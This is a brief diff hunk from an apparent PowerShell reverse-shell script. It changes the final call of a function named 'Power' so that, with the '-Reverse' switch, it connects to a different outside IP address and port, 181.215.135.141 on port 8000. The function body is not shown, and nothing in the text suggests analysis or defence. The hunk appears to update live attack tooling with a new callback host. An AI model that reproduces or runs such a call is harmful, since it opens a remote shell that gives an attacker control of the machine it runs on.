@@ -84,5 +84,5 @@ function Power
     }
 }
 
-Power -Reverse -IPAddress 18.229.146.63 -Port 17024
+Power -Reverse -IPAddress 181.215.135.141 -Port 8000
 
